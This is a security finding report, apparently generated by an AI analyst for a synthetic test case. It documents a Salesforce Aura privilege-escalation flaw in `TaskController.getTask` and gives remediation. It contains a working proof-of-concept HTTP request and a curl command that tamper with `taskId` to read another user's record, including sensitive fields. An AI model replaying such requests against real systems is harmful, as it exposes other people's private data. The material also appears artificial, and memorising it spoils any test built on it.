# Security Analysis Report
**System:** OreTrack Fleet Management (Mining / Resource Extraction) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0025 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.4 | Privilege escalation via parameter tampering — `TaskController.getTask` with tampered `taskId` accesses cross-user mining fleet records |

---

## Finding 1 — Privilege Escalation via `taskId` Parameter Tampering in Mining Fleet (CRITICAL)

### Summary
The `TaskController` Apex class on OreTrack Fleet Management (`de71f165.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Task records. Per §5.0 Pattern 2.4, the `getTask` Aura action is vulnerable to privilege escalation via parameter tampering: the attacker tampers the `taskId` parameter to a victim's record ID (`001F165`), elevating their effective privileges from "access own fleet tasks" to "access any fleet task." The controller processes the tampered ID without ownership validation, returning the victim's mining fleet task data and PII.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://de71f165.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://de71f165.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DDE71F165!ARde71f165...
message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","params":{"taskId":"001F165","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{"actions":[{"id":"1;a","state":"SUCCESS","returnValue":{"records":[{"Id":"001F165","Name":"Victim Task Record","OwnerId":"005VICTIM","InternalNotes__c":"CONFIDENTIAL: internal review notes","SensitiveData__c":"SSN: 000-84-7708"}]},"error":[]}]}
```

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §4.0 SOQL | No OwnerId predicate | Missing check | Root cause |
| §5.0 Pattern 2.4 | Vulnerability | Privilege escalation via tampering | Classification |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Entry point |
| HAR params | `taskId` | `001F165` | Tampered — victim record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-84-7708` | Mining fleet operator PII |

### Steps to Reproduce
```bash
SF_TOKEN="00DDE71F165!ARde71f165..."
curl -s -X POST "https://de71f165.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001F165","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# VULNERABLE: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-84-7708
```

### Remediation
1. `public with sharing class TaskController {`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
5. Mining domain: fleet telemetry, equipment schedules, operational data — cross-user access enables industrial espionage and safety system manipulation.
